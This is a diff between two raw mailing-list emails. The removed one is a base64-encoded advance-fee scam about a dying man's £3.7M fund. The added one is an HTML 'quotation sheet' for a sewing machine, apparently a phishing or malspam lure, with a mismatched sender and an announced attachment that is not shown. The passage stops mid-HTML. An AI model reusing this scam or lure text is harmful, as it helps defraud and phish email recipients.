@@ -1,56 +1,46 @@
 Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
 X-Original-To: lists+intel-gvt-dev@lfdr.de
 Delivered-To: lists+intel-gvt-dev@lfdr.de
-Received: from gabe.freedesktop.org (gabe.freedesktop.org [IPv6:2610:10:20:722:a800:ff:fe36:1795])
-	by mail.lfdr.de (Postfix) with ESMTPS id 3548A2405AE
-	for <lists+intel-gvt-dev@lfdr.de>; Mon, 10 Aug 2020 14:18:25 +0200 (CEST)
+Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
+	by mail.lfdr.de (Postfix) with ESMTPS id 036E824123C
+	for <lists+intel-gvt-dev@lfdr.de>; Mon, 10 Aug 2020 23:22:54 +0200 (CEST)
 Received: from gabe.freedesktop.org (localhost [127.0.0.1])
-	by gabe.freedesktop.org (Postfix) with ESMTP id 80D1B89B0B;
-	Mon, 10 Aug 2020 12:18:23 +0000 (UTC)
+	by gabe.freedesktop.org (Postfix) with ESMTP id 926C76E140;
+	Mon, 10 Aug 2020 21:22:53 +0000 (UTC)
 X-Original-To: intel-gvt-dev@lists.freedesktop.org
 Delivered-To: intel-gvt-dev@lists.freedesktop.org
-Received: from mail-lj1-x22a.google.com (mail-lj1-x22a.google.com
- [IPv6:2a00:1450:4864:20::22a])
- by gabe.freedesktop.org (Postfix) with ESMTPS id B494489B0B
+X-Greylist: delayed 318 seconds by postgrey-1.36 at gabe;
+ Mon, 10 Aug 2020 21:22:52 UTC
+Received: from wrqvxqhb.outbound-mail.sendgrid.net
+ (wrqvxqhb.outbound-mail.sendgrid.net [149.72.164.11])
+ by gabe.freedesktop.org (Postfix) with ESMTPS id 6458D6E140
  for <intel-gvt-dev@lists.freedesktop.org>;
- Mon, 10 Aug 2020 12:18:21 +0000 (UTC)
-Received: by mail-lj1-x22a.google.com with SMTP id f26so7892338ljc.8
+ Mon, 10 Aug 2020 21:22:52 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sendgrid.net; 
+ h=from:to:subject:mime-version:content-type; s=smtpapi; 
+ bh=dYUx6P1ZL7ouA3OW8uFygd0OwhPyXYsNrYLfsXhijAU=; b=XUITZwoGOWuwL
+ Mw28I4MAaa+aoxS3yplgoRjtWcgnLnDFi9LT//2PH3CzU/tRsz6Ixhdm4N4L2lAM
+ NQT5lUwUHQZjo91vcMnqB72CXsJKklr+o+Bx1+MwoA6D4LyXmIiXXNmjNkhTDdmA
+ UKS+UuthRPQk0266orUUfhXemK2Le8=
+Received: by filter1863p1mdw1.sendgrid.net with SMTP id
+ filter1863p1mdw1-1767-5F31B96D-C
+ 2020-08-10 21:17:33.475941248 +0000 UTC m=+518480.679241577
+Received: from congoactuel.com (unknown)
+ by ismtpd0040p1iad2.sendgrid.net (SG) with ESMTP id pTArQbPtS_WJKQu7K4J_1w
  for <intel-gvt-dev@lists.freedesktop.org>;
- Mon, 10 Aug 2020 05:18:21 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20161025;
- h=mime-version:reply-to:from:date:message-id:subject:to
- :content-transfer-encoding;
- bh=Duxa+mmNF3T3C2WDKsmzowR2OzvdY892XFjTPp0RWRI=;
- b=syefqBhEIbHfp/49+ec3OU/dPjcx9ByAKy8a9tAKHToxAlvDKtbfUI2pg/+/hCwJc9
- COLPbLMFKk0HCiEar9SEx2oCJWbd79bHcC+9XCWtYFJpZQGR2XjiExUDFxkWdL8sJ7Sb
- fS7msygkL3D0Bum68e0gMla/AZPEolBTprf843OhEnPr8Aok6UBYOW2K9u/2aNK6Lbfv
- xQv89eDj34SLOvJ+tnGH3Lc7YltSNurHewDif7O9QoXSWfvrN3et7xhOPc4LOuBdeeYN
- zPxtqA6FpW5AuuhyKgEWcVxMad7ZFsmxTyIp6QLvFHJe4gHe1UZYxifsp48lU2pKG7BY
- k0OQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20161025;
- h=x-gm-message-state:mime-version:reply-to:from:date:message-id
- :subject:to:content-transfer-encoding;
- bh=Duxa+mmNF3T3C2WDKsmzowR2OzvdY892XFjTPp0RWRI=;
- b=G04NtphwWvNOKpwlpvVdrz0z2wET5e8tcEEzE8Y49EWn+l0tF22Dxbev6xveLL09qa
- r+S2wjBs7hNhXf6hib4lz6cQ5eCMGanIV6XbBN8FzxzbPrAjjiNMdQ3ODoMOIqtaFzWO
- hNggweAFqHLQn7SJt/L7CRO0lhDUN2NZqD+wlKlgIx8FOX4pnzzZRu94gJD2dG6Xre2w
- 8U/uSsE2p90c/YYbxVhcgXglCaW8H8rxP9nB6LoBwM0iWpNHjuriN0Voqo5sYGVqikf7
- KSIoB89yrK22LgYz51i+JtlnnnbsNwPZkcqo/3PvXLMqBAhIRW7GRleQ96C3ozqCu5f4
- 71NQ==
-X-Gm-Message-State: AOAM5314q/ZqjOU53S+7yD8p+PINfErcSHKG7W3tHlIEJKXR7/8QjPwQ
- it3nWKu0+hmb6PdYoEdqlsI0oAhVsPjjdW7sx2o=
-X-Google-Smtp-Source: ABdhPJx59uu/x7zIPmHDOJmRuBEFV4Wcru386aw9xbwTnUFbvSVpR1Rtmrrn4P6fV1KaLQh2gf9PdhRBdYINAcMfPAY=
-X-Received: by 2002:a2e:9695:: with SMTP id q21mr366979lji.437.1597061900051; 
- Mon, 10 Aug 2020 05:18:20 -0700 (PDT)
+ Mon, 10 Aug 2020 21:17:33.399 +0000 (UTC)
+From: Ivan Lo | Wiloggroup <contact@congoactuel.com>
+To: intel-gvt-dev@lists.freedesktop.org
+Subject: Quotation sheet for EFB-CS 20200609
+Date: Mon, 10 Aug 2020 21:17:33 +0000 (UTC)
+Message-ID: <20200811062214.60D7FD14625CEE9E@congoactuel.com>
 MIME-Version: 1.0
-Received: by 2002:a2e:7c01:0:0:0:0:0 with HTTP; Mon, 10 Aug 2020 05:18:19
- -0700 (PDT)
-From: "Mr. Scott Donald" <keshintondesmond@gmail.com>
-Date: Mon, 10 Aug 2020 05:18:19 -0700
-Message-ID: <CA+nDMutabOMr0UbCpep35_pKAJv3bCKLTSiNh3gaHkDGbDZKig@mail.gmail.com>
-Subject: Hello. Please
-To: undisclosed-recipients:;
+Content-Type: multipart/mixed;
+ boundary="----=_NextPart_000_0012_EC780025.542D54B3"
+X-SG-EID: xrNGZqAPfUFPPo0N3F2c9DaeYtybIq/hvrjaCyepa+5uBfyZhkBZ1hC7anT6HDwM/s65baiaawIFws
+ I27Stu0qwTogXByuvBvYE2/ROMXVTGiPI+kFIYzs1cc9tWRNjlPL6AYkyz9JuTSHufPqYeW4z7UXim
+ ERdYW14GRz04eMm9RC9ijmSA0P4xP2sRJXP/YiQFipes0KHrIgDgks1ZmTu1cbdUEXAPuMAgx/tgpJ
+ kSDb/HOLm92eviXex2N3lc
 X-BeenThere: intel-gvt-dev@lists.freedesktop.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -63,39 +53,440 @@ List-Post: <mailto:intel-gvt-dev@lists.freedesktop.org>
 List-Help: <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=help>
 List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>, 
  <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=subscribe>
-Reply-To: sctnld11170@tlen.pl
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
 Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
 Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>
 
-LS0gCkRlYXIgRnJpZW5kLAoKSSdtIE1yLiBTY290dCBEb25hbGQgYSBTdWNjZXNzZnVsIGJ1c2lu
-ZXNzTWFuIGRlYWxpbmcgd2l0aApFeHBvcnRhdGlvbiwgSSBnb3QgeW91ciBtYWlsIGNvbnRhY3Qg
-dGhyb3VnaCBzZWFyY2ggdG8gbGV0IHlvdSBrbm93IG15CmludGVuc2lvbiBhbmQgbXkgVWdseSBT
-aXR1YXRpb24gQW0gYSBkeWluZyBNYW4gaGVyZSBpbiBMb3MgQW5nZWxlcwpDYWxpZm9ybmlhIEhv
-c3BpdGFsIEJlZCBpbiAoVVNBKSwgSSBMb3N0IG15IFdpZmUgYW5kIG15IG9ubHkgRGF1Z2h0ZXIK
-Zm9yIENvdmlkLTE5IGFuZCBJIGFsc28gaGF2ZSBhIHByb2JsZW0gaW4gbXkgSGVhbHRoIGFuZCBJ
-IGNhbiBkaWUKYW55dGltZSBJIEtub3csCgpJIGhhdmUgYSBwcm9qZWN0IHRoYXQgSSBhbSBhYm91
-dCB0byBoYW5kIG92ZXIgdG8geW91LiBhbmQgSSBhbHJlYWR5Cmluc3RydWN0ZWQgdGhlIEJhbmtp
-YSBTLkEuIE1hZHJpZCwgU3BhaW4oQlNBKSB0byB0cmFuc2ZlciBteSBmdW5kIHN1bQpvZiDCozMs
-N00gR0JQLiBFcXVpdmFsZW50IHRvIOKCrDQsMDc3LDAzMy45MSBFVVIsIHRvIHlvdSBhcyB0byBl
-bmFibGUgeW91CnRvIGdpdmUgNTAlIG9mIHRoaXMgZnVuZCB0byBDaGFyaXRhYmxlIEhvbWUgaW4g
-eW91ciBTdGF0ZSBhbmQgdGFrZSA1MCUKZG9uJ3QgdGhpbmsgb3RoZXJ3aXNlIGFuZCB3aHkgd291
-bGQgYW55Ym9keSBzZW5kIHNvbWVvbmUgeW91IGJhcmVseQprbm93IHRvIGhlbHAgeW91IGRlbGl2
-ZXIgYSBtZXNzYWdlLCBoZWxwIG1lIGRvIHRoaXMgZm9yIHRoZSBoYXBwaW5lc3MKb2YgbXkgc291
-bCBhbmQgZm9yIEdvZCB0byBtZXJjeSBtZSBhbmQgbXkgRmFtaWx5IGFuZCBnaXZlIFVzIGEgZ29v
-ZApwbGFjZS4KCnBsZWFzZSwgZG8gYXMgSSBzYWlkIHRoZXJlIHdhcyBzb21lb25lIGZyb20geW91
-ciBTdGF0ZSB0aGF0IEkgZGVlcGx5CmxvdmUgc28gdmVyeSB2ZXJ5IG11Y2ggYW5kIEkgbWlzcyBo
-ZXIgc28gYmFkbHkgSSBoYXZlIG5vIG1lYW5zIHRvCnJlYWNoIGFueSBDaGFyaXRhYmxlIEhvbWUg
-dGhlcmUuIHRoYXQgaXMgd2h5IEkgZ28gZm9yIGEgcGVyc29uYWwKc2VhcmNoIG9mIHRoZSBDb3Vu
-dHJ5IGFuZCBTdGF0ZSBhbmQgSSBnb3QgeW91ciBtYWlsIGNvbnRhY3QgdGhyb3VnaApzZWFyY2gg
-dG8gbGV0IHlvdSBrbm93IG15IEJpdHRlcm5lc3MgYW5kIHBsZWFzZSwgaGVscCBtZSBpcyBnZXR0
-aW5nCkRhcmsgSSBhc2sgbXkgRG9jdG9yIHRvIGhlbHAgbWUga2VlcCB5b3Ugbm90aWNlIGZhaWx1
-cmUgZm9yIG1lIHRvCnJlYWNoIHlvdSBpbiBwZXJzb24gWW91ciB1cmdlbnQgUmVzcG9uc2UsIGhl
-cmUgaXMgbXkgRG9jdG9yIFdoYXRzLWFwcApOdW1iZXIgZm9yIHVyZ2VudCBub3RpY2UgKzEzMDE5
-NjkyNzM3CgpIb3BlIFRvIEhlYXIgRnJvbSBZb3UuIEknbSBzZW5kaW5nIHRoaXMgZW1haWwgdG8g
-eW91IGZvciB0aGUgc2Vjb25kCnRpbWUgeWV0IG5vIHJlc3BvbnNlIGZyb20geW91LgoKTXkgUmVn
-YXJkcy4KCk1yLiBTY290dCBEb25hbGQKQ0VPCl9fX19fX19fX19fX19fX19fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fCmludGVsLWd2dC1kZXYgbWFpbGluZyBsaXN0CmludGVsLWd2dC1k
-ZXZAbGlzdHMuZnJlZWRlc2t0b3Aub3JnCmh0dHBzOi8vbGlzdHMuZnJlZWRlc2t0b3Aub3JnL21h
-aWxtYW4vbGlzdGluZm8vaW50ZWwtZ3Z0LWRldgo=
+This is a multi-part message in MIME format.
+------=_NextPart_000_0012_EC780025.542D54B3
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19541"></HEAD>
+<body>
+<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
+hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
+boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
+ TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
+normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
+ebkit-font-smoothing: antialiased;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
+ial' align=3Dleft><FONT style=3D"-webkit-font-smoothing: antialiased" face=
+=3DCalibri><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoothing: =
+antialiased"><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoothing=
+: antialiased">good afternoon!</FONT></FONT></FONT></P>
+<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
+hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
+boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
+ TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
+normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
+ebkit-font-smoothing: antialiased;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
+ial' align=3Dleft><FONT style=3D"-webkit-font-smoothing: antialiased" face=
+=3DCalibri></FONT></P>
+<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
+hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
+boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
+ TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
+normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
+ebkit-font-smoothing: antialiased;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
+ial' align=3Dleft><FONT style=3D"-webkit-font-smoothing: antialiased" face=
+=3DCalibri><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoothing: =
+antialiased"><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoothing=
+: antialiased">EFB-CS, fixed table overlock sewing machine</FONT></FONT></F=
+ONT></P>
+<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
+hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
+boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
+ TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
+normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
+ebkit-font-smoothing: antialiased;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
+ial' align=3Dleft><FONT style=3D"-webkit-font-smoothing: antialiased" face=
+=3DCalibri><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoothing: =
+antialiased"><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoothing=
+: antialiased">Price: US$5900/Unit FOB Ningbo</FONT></FONT></FONT><FONT sty=
+le=3D"-webkit-font-smoothing: antialiased" face=3DCalibri>
+<BR style=3D"-webkit-font-smoothing: antialiased"></FONT></P>
+<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
+hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
+boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
+ TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
+normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
+ebkit-font-smoothing: antialiased;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
+ial' align=3Dleft><FONT style=3D"-webkit-font-smoothing: antialiased" face=
+=3DCalibri><BR style=3D"-webkit-font-smoothing: antialiased">&nbsp;</FONT><=
+/P>
+<DIV style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: "Microsoft Yah=
+ei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Rob=
+oto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; FO=
+NT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-=
+LEFT: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; -webkit-font-smoothing: antialiased; font-variant-ligatures: normal;=
+ font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-style: initial; text-decoration-color: initial; font-variant-numeric: inhe=
+rit; font-variant-east-asian: inherit; font-stretch: inherit'></DIV>
+<OL style=3D'MARGIN-BOTTOM: 0px; FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Y=
+ahei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, R=
+oboto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px=
+; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE:=
+ normal; ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; LETTER-SPACING: normal; BA=
+CKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -webkit-font-smoothing:=
+ antialiased; font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+style: initial; text-decoration-color: initial'>
+<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
+nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
+herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
+inherit; -webkit-font-smoothing: antialiased">Automatic deceleration of cor=
+ners: YES</FONT></FONT></FONT></LI>
+<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
+nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
+herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
+inherit; -webkit-font-smoothing: antialiased">Head: SINGER 300U</FONT></FON=
+T></FONT></LI>
+<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
+nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
+herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
+inherit; -webkit-font-smoothing: antialiased">Lifting range of worktable: 1=
+40mm</FONT></FONT></FONT></LI>
+<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
+nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
+herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
+inherit; -webkit-font-smoothing: antialiased">Workbench size: 1600x2000mm</=
+FONT></FONT></FONT></LI>
+<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
+nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
+herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
+inherit; -webkit-font-smoothing: antialiased">Table lifting form: automatic=
+</FONT></FONT></FONT></LI>
+<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
+nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
+herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
+inherit; -webkit-font-smoothing: antialiased">Overlock mattress thickness: =
+30-450mm</FONT></FONT></FONT></LI>
+<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
+nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
+herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
+inherit; -webkit-font-smoothing: antialiased">Production efficiency (pcs/ho=
+ur): 10-20</FONT></FONT></FONT></LI>
+<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
+nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
+herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
+inherit; -webkit-font-smoothing: antialiased">Total motor power: 1.2KW</FON=
+T></FONT></FONT></LI>
+<LI style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"-webkit-fo=
+nt-smoothing: antialiased" face=3DCalibri><FONT style=3D"VERTICAL-ALIGN: in=
+herit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-ALIGN: =
+inherit; -webkit-font-smoothing: antialiased">Voltage: 220V, 1P, 50HZ</FONT=
+></FONT><BR style=3D"-webkit-font-smoothing: antialiased"></FONT></LI></OL>
+<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
+hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
+boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
+ TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
+normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
+ebkit-font-smoothing: antialiased;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
+ial' align=3Dleft><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-smoo=
+thing: antialiased"><FONT style=3D"VERTICAL-ALIGN: inherit; -webkit-font-sm=
+oothing: antialiased">Our quotation is for standard models and voltage "220=
+V, 1P, 50HZ", if you need to customize, please inform us in time.</FONT></F=
+ONT><BR style=3D"-webkit-font-smoothing: antialiased">
+<BR style=3D"-webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL-A=
+LIGN: inherit; -webkit-font-smoothing: antialiased"><FONT style=3D"VERTICAL=
+-ALIGN: inherit; -webkit-font-smoothing: antialiased">Attached is the quota=
+tion, please check it and wait for your reply, thank you</FONT></FONT><BR s=
+tyle=3D"-webkit-font-smoothing: antialiased"></P>
+<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
+hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
+boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
+ TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
+normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
+ebkit-font-smoothing: antialiased;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
+ial' align=3Dleft></P>
+<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
+hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
+boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
+ TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
+normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
+ebkit-font-smoothing: antialiased;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
+ial' align=3Dleft></P>
+<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
+hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
+boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
+ TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE: =
+normal; TEXT-ALIGN: left; MARGIN: 0cm 0cm 0pt; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; -w=
+ebkit-font-smoothing: antialiased;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
+ial' align=3Dleft><A style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-=
+ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0px; -web=
+kit-font-smoothing: antialiased" name=3Dx__GoBack>
+<SPAN lang=3DEN-US style=3D"FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: =
+inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; C=
+OLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0=
+px; BORDER-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialias=
+ed; font-stretch: inherit"><FONT style=3D"-webkit-font-smoothing: antialias=
+ed" face=3DCalibri>Best regards!</FONT></SPAN></A></P>
+<DIV style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: "Microsoft Yah=
+ei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Rob=
+oto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; FO=
+NT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-=
+LEFT: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; -webkit-font-smoothing: antialiased; font-variant-ligatures: normal;=
+ font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-style: initial; text-decoration-color: initial; font-variant-numeric: inhe=
+rit; font-variant-east-asian: inherit; font-stretch: inherit'></DIV>
+<P class=3Dx_MsoNormal style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Microsoft Ya=
+hei UI", Verdana, Simsun, "Segoe UI", -apple-system, BlinkMacSystemFont, Ro=
+boto, "Helvetica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px;=
